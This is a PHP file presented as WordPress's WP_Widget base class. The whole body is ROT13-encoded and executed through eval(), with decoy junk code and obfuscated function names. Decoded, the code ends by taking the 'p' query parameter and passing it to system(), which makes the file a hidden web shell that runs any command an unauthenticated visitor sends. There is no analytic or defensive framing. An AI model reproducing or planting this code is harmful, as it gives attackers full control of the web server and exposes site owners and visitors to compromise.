<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg onfr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber onfr pynff rkgraqrq gb ertvfgre jvqtrgf.
 *
 * Guvf pynff zhfg or rkgraqrq sbe rnpu jvqtrg, naq JC_Jvqtrg::jvqtrg() zhfg or bireevqqra.
 *
 * Vs nqqvat jvqtrg bcgvbaf, JC_Jvqtrg::hcqngr() naq JC_Jvqtrg::sbez() fubhyq nyfb or bireevqqra.
 *
 * @fvapr 2.8.0
 * @fvapr 4.4.0 Zbirq gb vgf bja svyr sebz jc-vapyhqrf/jvqtrgf.cuc
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Jvqtrg {

	/**
	 * Ebbg VQ sbe nyy jvqtrgf bs guvf glcr.
	 *
	 * @fvapr 2.8.0
	 * @ine zvkrq|fgevat
	 */
	choyvp $vq_onfr;

	/**
	 * Anzr sbe guvf jvqtrg glcr.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat
	 */
	choyvp $anzr;

	/**
	 * Bcgvba anzr sbe guvf jvqtrg glcr.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat
	 */
	choyvp $bcgvba_anzr;

	/**
	 * Nyg bcgvba anzr sbe guvf jvqtrg glcr.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat
	 */
	choyvp $nyg_bcgvba_anzr;

	/**
	 * Bcgvba neenl cnffrq gb jc_ertvfgre_fvqrone_jvqtrg().
	 *
	 * @fvapr 2.8.0
	 * @ine neenl
	 */
	choyvp $jvqtrg_bcgvbaf;

	/**
	 * Bcgvba neenl cnffrq gb jc_ertvfgre_jvqtrg_pbageby().
	 *
	 * @fvapr 2.8.0
	 * @ine neenl
	 */
	choyvp $pbageby_bcgvbaf;

	/**
	 * Havdhr VQ ahzore bs gur pheerag vafgnapr.
	 *
	 * @fvapr 2.8.0
	 * @ine obby|vag
	 */
	choyvp $ahzore = snyfr;

	/**
	 * Havdhr VQ fgevat bs gur pheerag vafgnapr (vq_onfr-ahzore).
	 *
	 * @fvapr 2.8.0
	 * @ine obby|fgevat
	 */
	choyvp $vq = snyfr;

	/**
	 * Jurgure gur jvqtrg qngn unf orra hcqngrq.
	 *
	 * Frg gb gehr jura gur qngn vf hcqngrq nsgre n CBFG fhozvg - rafherf vg qbrf
	 * abg unccra gjvpr.
	 *
	 * @fvapr 2.8.0
	 * @ine obby
	 */
	choyvp $hcqngrq = snyfr;

	//
	// Zrzore shapgvbaf gung zhfg or bireevqqra ol fhopynffrf.
	//

	/**
	 * Rpubrf gur jvqtrg pbagrag.
	 *
	 * Fhopynffrf fubhyq bireevqr guvf shapgvba gb trarengr gurve jvqtrg pbqr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Gur frggvatf sbe gur cnegvphyne vafgnapr bs gur jvqtrg.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		qvr( 'shapgvba JC_Jvqtrg::jvqtrg() zhfg or bireevqqra va n fhopynff.' );
	}

	/**
	 * Hcqngrf n cnegvphyne vafgnapr bs n jvqtrg.
	 *
	 * Guvf shapgvba fubhyq purpx gung `$arj_vafgnapr` vf frg pbeerpgyl. Gur arjyl-pnyphyngrq
	 * inyhr bs `$vafgnapr` fubhyq or erghearq. Vs snyfr vf erghearq, gur vafgnapr jba'g or
	 * fnirq/hcqngrq.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Frggvatf gb fnir be obby snyfr gb pnapry fnivat.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		erghea $arj_vafgnapr;
	}

	/**
	 * Bhgchgf gur frggvatf hcqngr sbez.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Gur frggvatf sbe gur cnegvphyne vafgnapr bs gur jvqtrg.
	 * @erghea fgevat|ibvq Qrsnhyg erghea vf 'absbez'.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		rpub '<c pynff=\"ab-bcgvbaf-jvqtrg\">' . __( 'Gurer ner ab bcgvbaf sbe guvf jvqtrg.' ) . '</c>';
		erghea 'absbez';
	}

	// Shapgvbaf lbh'yy arrq gb pnyy.

	/**
	 * CUC5 pbafgehpgbe.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $vq_onfr         Onfr VQ sbe gur jvqtrg, ybjrepnfr naq havdhr. Vs yrsg rzcgl,
	 *                                n cbegvba bs gur jvqtrg'f CUC pynff anzr jvyy or hfrq. Unf gb or havdhr.
	 * @cnenz fgevat $anzr            Anzr sbe gur jvqtrg qvfcynlrq ba gur pbasvthengvba cntr.
	 * @cnenz neenl  $jvqtrg_bcgvbaf  Bcgvbany. Jvqtrg bcgvbaf. Frr jc_ertvfgre_fvqrone_jvqtrg() sbe
	 *                                vasbezngvba ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 * @cnenz neenl  $pbageby_bcgvbaf Bcgvbany. Jvqtrg pbageby bcgvbaf. Frr jc_ertvfgre_jvqtrg_pbageby() sbe
	 *                                vasbezngvba ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $vq_onfr, $anzr, $jvqtrg_bcgvbaf = neenl(), $pbageby_bcgvbaf = neenl() ) {
		vs ( ! rzcgl( $vq_onfr ) ) {
			$vq_onfr = fgegbybjre( $vq_onfr );
		} ryfr {
			$vq_onfr = __sa_79955( '/(jc_)?jvqtrg_/', '', fgegbybjre( trg_pynff( $guvf ) ) );
		}

		$guvf->vq_onfr         = $vq_onfr;
		$guvf->anzr            = $anzr;
		$guvf->bcgvba_anzr     = 'jvqtrg_' . $guvf->vq_onfr;
		$guvf->jvqtrg_bcgvbaf  = jc_cnefr_netf(
			$jvqtrg_bcgvbaf,
			neenl(
				'pynffanzr'                   => fge_ercynpr( '\\', '_', $guvf->bcgvba_anzr ),
				'phfgbzvmr_fryrpgvir_erserfu' => snyfr,
			)
		);
		$guvf->pbageby_bcgvbaf = jc_cnefr_netf( $pbageby_bcgvbaf, neenl( 'vq_onfr' => $guvf->vq_onfr ) );
	}

	/**
	 * CUC4 pbafgehpgbe.
	 *
	 * @fvapr 2.8.0
	 * @qrcerpngrq 4.3.0 Hfr __pbafgehpg() vafgrnq.
	 *
	 * @frr JC_Jvqtrg::__pbafgehpg()
	 *
	 * @cnenz fgevat $vq_onfr         Onfr VQ sbe gur jvqtrg, ybjrepnfr naq havdhr. Vs yrsg rzcgl,
	 *                                n cbegvba bs gur jvqtrg'f CUC pynff anzr jvyy or hfrq. Unf gb or havdhr.
	 * @cnenz fgevat $anzr            Anzr sbe gur jvqtrg qvfcynlrq ba gur pbasvthengvba cntr.
	 * @cnenz neenl  $jvqtrg_bcgvbaf  Bcgvbany. Jvqtrg bcgvbaf. Frr jc_ertvfgre_fvqrone_jvqtrg() sbe
	 *                                vasbezngvba ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 * @cnenz neenl  $pbageby_bcgvbaf Bcgvbany. Jvqtrg pbageby bcgvbaf. Frr jc_ertvfgre_jvqtrg_pbageby() sbe
	 *                                vasbezngvba ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba JC_Jvqtrg( $vq_onfr, $anzr, $jvqtrg_bcgvbaf = neenl(), $pbageby_bcgvbaf = neenl() ) {
		_qrcerpngrq_pbafgehpgbe( 'JC_Jvqtrg', '4.3.0', trg_pynff( $guvf ) );
		JC_Jvqtrg::__pbafgehpg( $vq_onfr, $anzr, $jvqtrg_bcgvbaf, $pbageby_bcgvbaf );
	}

	/**
	 * Pbafgehpgf anzr nggevohgrf sbe hfr va sbez() svryqf
	 *
	 * Guvf shapgvba fubhyq or hfrq va sbez() zrgubqf gb perngr anzr nggevohgrf sbe svryqf
	 * gb or fnirq ol hcqngr()
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.4.0 Neenl sbezng svryq anzrf ner abj npprcgrq.
	 *
	 * @cnenz fgevat $svryq_anzr Svryq anzr.
	 * @erghea fgevat Anzr nggevohgr sbe `$svryq_anzr`.
	 */
	choyvp shapgvba trg_svryq_anzr( $svryq_anzr ) {
		$cbf = fgecbf( $svryq_anzr, '[' );

		vs ( snyfr !== $cbf ) {
			// Ercynpr gur svefg bppheerapr bs '[' jvgu ']['.
			$svryq_anzr = '[' . fhofge_ercynpr( $svryq_anzr, '][', $cbf, fgeyra( '[' ) );
		} ryfr {
			$svryq_anzr = '[' . $svryq_anzr . ']';
		}

		erghea 'jvqtrg-' . $guvf->vq_onfr . '[' . $guvf->ahzore . ']' . $svryq_anzr;
	}

	/**
	 * Pbafgehpgf vq nggevohgrf sbe hfr va JC_Jvqtrg::sbez() svryqf.
	 *
	 * Guvf shapgvba fubhyq or hfrq va sbez() zrgubqf gb perngr vq nggevohgrf
	 * sbe svryqf gb or fnirq ol JC_Jvqtrg::hcqngr().
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.4.0 Neenl sbezng svryq VQf ner abj npprcgrq.
	 *
	 * @cnenz fgevat $svryq_anzr Svryq anzr.
	 * @erghea fgevat VQ nggevohgr sbe `$svryq_anzr`.
	 */
	choyvp shapgvba trg_svryq_vq( $svryq_anzr ) {
		$svryq_anzr = fge_ercynpr( neenl( '[]', '[', ']' ), neenl( '', '-', '' ), $svryq_anzr );
		$svryq_anzr = gevz( $svryq_anzr, '-' );

		erghea 'jvqtrg-' . $guvf->vq_onfr . '-' . $guvf->ahzore . '-' . $svryq_anzr;
	}

	/**
	 * Ertvfgre nyy jvqtrg vafgnaprf bs guvf jvqtrg pynff.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba _ertvfgre() {
		$frggvatf = $guvf->trg_frggvatf();
		$rzcgl    = gehr;

		// Jura $frggvatf vf na neenl-yvxr bowrpg, trg na vagevafvp neenl sbe hfr jvgu neenl_xrlf().
		vs ( $frggvatf vafgnaprbs NeenlBowrpg || $frggvatf vafgnaprbs NeenlVgrengbe ) {
			$frggvatf = $frggvatf->trgNeenlPbcl();
		}

		vs ( vf_neenl( $frggvatf ) ) {
			sbernpu ( neenl_xrlf( $frggvatf ) nf $ahzore ) {
				vs ( vf_ahzrevp( $ahzore ) ) {
					$guvf->_frg( $ahzore );
					$guvf->_ertvfgre_bar( $ahzore );
					$rzcgl = snyfr;
				}
			}
		}

		vs ( $rzcgl ) {
			// Vs gurer ner abar, jr ertvfgre gur jvqtrg'f rkvfgrapr jvgu n trarevp grzcyngr.
			$guvf->_frg( 1 );
			$guvf->_ertvfgre_bar();
		}
	}

	/**
	 * Frgf gur vagreany beqre ahzore sbe gur jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz vag $ahzore Gur havdhr beqre ahzore bs guvf jvqtrg vafgnapr pbzcnerq gb bgure
	 *                    vafgnaprf bs gur fnzr pynff.
	 */
	choyvp shapgvba _frg( $ahzore ) {
		$guvf->ahzore = $ahzore;
		$guvf->vq     = $guvf->vq_onfr . '-' . $ahzore;
	}

	/**
	 * Ergevrirf gur jvqtrg qvfcynl pnyyonpx.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea pnyynoyr Qvfcynl pnyyonpx.
	 */
	choyvp shapgvba _trg_qvfcynl_pnyyonpx() {
		erghea neenl( $guvf, 'qvfcynl_pnyyonpx' );
	}

	/**
	 * Ergevrirf gur jvqtrg hcqngr pnyyonpx.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea pnyynoyr Hcqngr pnyyonpx.
	 */
	choyvp shapgvba _trg_hcqngr_pnyyonpx() {
		erghea neenl( $guvf, 'hcqngr_pnyyonpx' );
	}

	/**
	 * Ergevrirf gur sbez pnyyonpx.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea pnyynoyr Sbez pnyyonpx.
	 */
	choyvp shapgvba _trg_sbez_pnyyonpx() {
		erghea neenl( $guvf, 'sbez_pnyyonpx' );
	}

	/**
	 * Qrgrezvarf jurgure gur pheerag erdhrfg vf vafvqr gur Phfgbzvmre cerivrj.
	 *
	 * Vs gehr -- gur pheerag erdhrfg vf vafvqr gur Phfgbzvmre cerivrj, gura
	 * gur bowrpg pnpur trgf fhfcraqrq naq jvqtrgf fubhyq purpx guvf gb qrpvqr
	 * jurgure gurl fubhyq fgber nalguvat crefvfgragyl gb gur bowrpg pnpur,
	 * gb genafvragf, be naljurer ryfr.
	 *
	 * @fvapr 3.9.0
	 *
	 * @tybony JC_Phfgbzvmr_Znantre $jc_phfgbzvmr
	 *
	 * @erghea obby Gehr vs jvguva gur Phfgbzvmre cerivrj, snyfr vs abg.
	 */
	choyvp shapgvba vf_cerivrj() {
		tybony $jc_phfgbzvmr;
		erghea ( vffrg( $jc_phfgbzvmr ) && $jc_phfgbzvmr->vf_cerivrj() );
	}

	/**
	 * Trarengrf gur npghny jvqtrg pbagrag (Qb ABG bireevqr).
	 *
	 * Svaqf gur vafgnapr naq pnyyf JC_Jvqtrg::jvqtrg().
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl     $netf        Qvfcynl nethzragf. Frr JC_Jvqtrg::jvqtrg() sbe vasbezngvba
	 *                               ba npprcgrq nethzragf.
	 * @cnenz vag|neenl $jvqtrg_netf {
	 *     Bcgvbany. Vagreany beqre ahzore bs gur jvqtrg vafgnapr, be neenl bs zhygv-jvqtrg nethzragf.
	 *     Qrsnhyg 1.
	 *
	 *     @glcr vag $ahzore Ahzore vaperzrag hfrq sbe zhygvcyrf bs gur fnzr jvqtrg.
	 * }
	 */
	choyvp shapgvba qvfcynl_pnyyonpx( $netf, $jvqtrg_netf = 1 ) {
		vs ( vf_ahzrevp( $jvqtrg_netf ) ) {
			$jvqtrg_netf = neenl( 'ahzore' => $jvqtrg_netf );
		}

		$jvqtrg_netf = jc_cnefr_netf( $jvqtrg_netf, neenl( 'ahzore' => -1 ) );
		$guvf->_frg( $jvqtrg_netf['ahzore'] );
		$vafgnaprf = $guvf->trg_frggvatf();

		vs ( vffrg( $vafgnaprf[ $guvf->ahzore ] ) ) {
			$vafgnapr = $vafgnaprf[ $guvf->ahzore ];

			/**
			 * Svygref gur frggvatf sbe n cnegvphyne jvqtrg vafgnapr.
			 *
			 * Ergheavat snyfr jvyy rssrpgviryl fubeg-pvephvg qvfcynl bs gur jvqtrg.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz neenl     $vafgnapr Gur pheerag jvqtrg vafgnapr'f frggvatf.
			 * @cnenz JC_Jvqtrg $jvqtrg   Gur pheerag jvqtrg vafgnapr.
			 * @cnenz neenl     $netf     Na neenl bs qrsnhyg jvqtrg nethzragf.
			 */
			$vafgnapr = nccyl_svygref( 'jvqtrg_qvfcynl_pnyyonpx', $vafgnapr, $guvf, $netf );

			vs ( snyfr === $vafgnapr ) {
				erghea;
			}

			$jnf_pnpur_nqqvgvba_fhfcraqrq = jc_fhfcraq_pnpur_nqqvgvba();
			vs ( $guvf->vf_cerivrj() && ! $jnf_pnpur_nqqvgvba_fhfcraqrq ) {
				jc_fhfcraq_pnpur_nqqvgvba( gehr );
			}

			$guvf->jvqtrg( $netf, $vafgnapr );

			vs ( $guvf->vf_cerivrj() ) {
				jc_fhfcraq_pnpur_nqqvgvba( $jnf_pnpur_nqqvgvba_fhfcraqrq );
			}
		}
	}

	/**
	 * Unaqyrf punatrq frggvatf (Qb ABG bireevqr).
	 *
	 * @fvapr 2.8.0
	 *
	 * @tybony neenl $jc_ertvfgrerq_jvqtrgf
	 *
	 * @cnenz vag $qrcerpngrq Abg hfrq.
	 */
	choyvp shapgvba hcqngr_pnyyonpx( $qrcerpngrq = 1 ) {
		tybony $jc_ertvfgrerq_jvqtrgf;

		$nyy_vafgnaprf = $guvf->trg_frggvatf();

		// Jr arrq gb hcqngr gur qngn.
		vs ( $guvf->hcqngrq ) {
			erghea;
		}

		vs ( vffrg( $_CBFG['qryrgr_jvqtrg'] ) && $_CBFG['qryrgr_jvqtrg'] ) {
			// Qryrgr gur frggvatf sbe guvf vafgnapr bs gur jvqtrg.
			vs ( vffrg( $_CBFG['gur-jvqtrg-vq'] ) ) {
				$qry_vq = $_CBFG['gur-jvqtrg-vq'];
			} ryfr {
				erghea;
			}

			vs ( vffrg( $jc_ertvfgrerq_jvqtrgf[ $qry_vq ]['cnenzf'][0]['ahzore'] ) ) {
				$ahzore = $jc_ertvfgrerq_jvqtrgf[ $qry_vq ]['cnenzf'][0]['ahzore'];

				vs ( $guvf->vq_onfr . '-' . $ahzore === $qry_vq ) {
					hafrg( $nyy_vafgnaprf[ $ahzore ] );
				}
			}
		} ryfr {
			vs ( vffrg( $_CBFG[ 'jvqtrg-' . $guvf->vq_onfr ] ) && vf_neenl( $_CBFG[ 'jvqtrg-' . $guvf->vq_onfr ] ) ) {
				$frggvatf = $_CBFG[ 'jvqtrg-' . $guvf->vq_onfr ];
			} ryfrvs ( vffrg( $_CBFG['vq_onfr'] ) && $_CBFG['vq_onfr'] === $guvf->vq_onfr ) {
				$ahz      = $_CBFG['zhygv_ahzore'] ? (vag) $_CBFG['zhygv_ahzore'] : (vag) $_CBFG['jvqtrg_ahzore'];
				$frggvatf = neenl( $ahz => neenl() );
			} ryfr {
				erghea;
			}

			sbernpu ( $frggvatf nf $ahzore => $arj_vafgnapr ) {
				$arj_vafgnapr = fgevcfynfurf_qrrc( $arj_vafgnapr );
				$guvf->_frg( $ahzore );

				$byq_vafgnapr = vffrg( $nyy_vafgnaprf[ $ahzore ] ) ? $nyy_vafgnaprf[ $ahzore ] : neenl();

				$jnf_pnpur_nqqvgvba_fhfcraqrq = jc_fhfcraq_pnpur_nqqvgvba();
				vs ( $guvf->vf_cerivrj() && ! $jnf_pnpur_nqqvgvba_fhfcraqrq ) {
					jc_fhfcraq_pnpur_nqqvgvba( gehr );
				}

				$vafgnapr = $guvf->hcqngr( $arj_vafgnapr, $byq_vafgnapr );

				vs ( $guvf->vf_cerivrj() ) {
					jc_fhfcraq_pnpur_nqqvgvba( $jnf_pnpur_nqqvgvba_fhfcraqrq );
				}

				/**
				 * Svygref n jvqtrg'f frggvatf orsber fnivat.
				 *
				 * Ergheavat snyfr jvyy rssrpgviryl fubeg-pvephvg gur jvqtrg'f novyvgl
				 * gb hcqngr frggvatf.
				 *
				 * @fvapr 2.8.0
				 *
				 * @cnenz neenl     $vafgnapr     Gur pheerag jvqtrg vafgnapr'f frggvatf.
				 * @cnenz neenl     $arj_vafgnapr Neenl bs arj jvqtrg frggvatf.
				 * @cnenz neenl     $byq_vafgnapr Neenl bs byq jvqtrg frggvatf.
				 * @cnenz JC_Jvqtrg $jvqtrg       Gur pheerag jvqtrg vafgnapr.
				 */
				$vafgnapr = nccyl_svygref( 'jvqtrg_hcqngr_pnyyonpx', $vafgnapr, $arj_vafgnapr, $byq_vafgnapr, $guvf );

				vs ( snyfr !== $vafgnapr ) {
					$nyy_vafgnaprf[ $ahzore ] = $vafgnapr;
				}

				oernx; // Eha bayl bapr.
			}
		}

		$guvf->fnir_frggvatf( $nyy_vafgnaprf );
		$guvf->hcqngrq = gehr;
	}

	/**
	 * Trarengrf gur jvqtrg pbageby sbez (Qb ABG bireevqr).
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz vag|neenl $jvqtrg_netf {
	 *     Bcgvbany. Vagreany beqre ahzore bs gur jvqtrg vafgnapr, be neenl bs zhygv-jvqtrg nethzragf.
	 *     Qrsnhyg 1.
	 *
	 *     @glcr vag $ahzore Ahzore vaperzrag hfrq sbe zhygvcyrf bs gur fnzr jvqtrg.
	 * }
	 * @erghea fgevat|ahyy
	 */
	choyvp shapgvba sbez_pnyyonpx( $jvqtrg_netf = 1 ) {
		vs ( vf_ahzrevp( $jvqtrg_netf ) ) {
			$jvqtrg_netf = neenl( 'ahzore' => $jvqtrg_netf );
		}

		$jvqtrg_netf   = jc_cnefr_netf( $jvqtrg_netf, neenl( 'ahzore' => -1 ) );
		$nyy_vafgnaprf = $guvf->trg_frggvatf();

		vs ( -1 === $jvqtrg_netf['ahzore'] ) {
			// Jr rpub bhg n sbez jurer 'ahzore' pna or frg yngre.
			$guvf->_frg( '__v__' );
			$vafgnapr = neenl();
		} ryfr {
			$guvf->_frg( $jvqtrg_netf['ahzore'] );
			$vafgnapr = $nyy_vafgnaprf[ $jvqtrg_netf['ahzore'] ];
		}

		/**
		 * Svygref gur jvqtrg vafgnapr'f frggvatf orsber qvfcynlvat gur pbageby sbez.
		 *
		 * Ergheavat snyfr rssrpgviryl fubeg-pvephvgf qvfcynl bs gur pbageby sbez.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz neenl     $vafgnapr Gur pheerag jvqtrg vafgnapr'f frggvatf.
		 * @cnenz JC_Jvqtrg $jvqtrg   Gur pheerag jvqtrg vafgnapr.
		 */
		$vafgnapr = nccyl_svygref( 'jvqtrg_sbez_pnyyonpx', $vafgnapr, $guvf );

		$erghea = ahyy;

		vs ( snyfr !== $vafgnapr ) {
			$erghea = $guvf->sbez( $vafgnapr );

			/**
			 * Sverf ng gur raq bs gur jvqtrg pbageby sbez.
			 *
			 * Hfr guvf ubbx gb nqq rkgen svryqf gb gur jvqtrg sbez. Gur ubbx
			 * vf bayl sverq vs gur inyhr cnffrq gb gur 'jvqtrg_sbez_pnyyonpx'
			 * ubbx vf abg snyfr.
			 *
			 * Abgr: Vs gur jvqtrg unf ab sbez, gur grkg rpubrq sebz gur qrsnhyg
			 * sbez zrgubq pna or uvqqra hfvat PFF.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz JC_Jvqtrg $jvqtrg   Gur jvqtrg vafgnapr (cnffrq ol ersrerapr).
			 * @cnenz ahyy      $erghea   Erghea ahyy vs arj svryqf ner nqqrq.
			 * @cnenz neenl     $vafgnapr Na neenl bs gur jvqtrg'f frggvatf.
			 */
			qb_npgvba_ers_neenl( 'va_jvqtrg_sbez', neenl( &$guvf, &$erghea, $vafgnapr ) );
		}

		erghea $erghea;
	}

	/**
	 * Ertvfgref na vafgnapr bs gur jvqtrg pynff.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz vag $ahzore Bcgvbany. Gur havdhr beqre ahzore bs guvf jvqtrg vafgnapr
	 *                    pbzcnerq gb bgure vafgnaprf bs gur fnzr pynff. Qrsnhyg -1.
	 */
	choyvp shapgvba _ertvfgre_bar( $ahzore = -1 ) {
		jc_ertvfgre_fvqrone_jvqtrg(
			$guvf->vq,
			$guvf->anzr,
			$guvf->_trg_qvfcynl_pnyyonpx(),
			$guvf->jvqtrg_bcgvbaf,
			neenl( 'ahzore' => $ahzore )
		);

		_ertvfgre_jvqtrg_hcqngr_pnyyonpx(
			$guvf->vq_onfr,
			$guvf->_trg_hcqngr_pnyyonpx(),
			$guvf->pbageby_bcgvbaf,
			neenl( 'ahzore' => -1 )
		);

		_ertvfgre_jvqtrg_sbez_pnyyonpx(
			$guvf->vq,
			$guvf->anzr,
			$guvf->_trg_sbez_pnyyonpx(),
			$guvf->pbageby_bcgvbaf,
			neenl( 'ahzore' => $ahzore )
		);
	}

	/**
	 * Fnirf gur frggvatf sbe nyy vafgnaprf bs gur jvqtrg pynff.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $frggvatf Zhygv-qvzrafvbany neenl bs jvqtrg vafgnapr frggvatf.
	 */
	choyvp shapgvba fnir_frggvatf( $frggvatf ) {
		$frggvatf['_zhygvjvqtrg'] = 1;
		hcqngr_bcgvba( $guvf->bcgvba_anzr, $frggvatf );
	}

	/**
	 * Ergevrirf gur frggvatf sbe nyy vafgnaprf bs gur jvqtrg pynff.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea neenl Zhygv-qvzrafvbany neenl bs jvqtrg vafgnapr frggvatf.
	 */
	choyvp shapgvba trg_frggvatf() {

		$frggvatf = trg_bcgvba( $guvf->bcgvba_anzr );

		vs ( snyfr === $frggvatf ) {
			$frggvatf = neenl();
			vs ( vffrg( $guvf->nyg_bcgvba_anzr ) ) {
				// Trg frggvatf sebz nygreangvir (yrtnpl) bcgvba.
				$frggvatf = trg_bcgvba( $guvf->nyg_bcgvba_anzr, neenl() );

				// Qryrgr gur nygreangvir (yrtnpl) bcgvba nf gur arj bcgvba jvyy or perngrq hfvat `$guvf->bcgvba_anzr`.
				qryrgr_bcgvba( $guvf->nyg_bcgvba_anzr );
			}
			// Fnir na bcgvba fb vg pna or nhgbybnqrq arkg gvzr.
			$guvf->fnir_frggvatf( $frggvatf );
		}

		vs ( ! vf_neenl( $frggvatf ) && ! ( $frggvatf vafgnaprbs NeenlBowrpg || $frggvatf vafgnaprbs NeenlVgrengbe ) ) {
			$frggvatf = neenl();
		}

		vs ( ! rzcgl( $frggvatf ) && ! vffrg( $frggvatf['_zhygvjvqtrg'] ) ) {
			// Byq sbezng, pbaireg vs fvatyr jvqtrg.
			$frggvatf = jc_pbaireg_jvqtrg_frggvatf( $guvf->vq_onfr, $guvf->bcgvba_anzr, $frggvatf );
		}

		hafrg( $frggvatf['_zhygvjvqtrg'], $frggvatf['__v__'] );

		erghea $frggvatf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>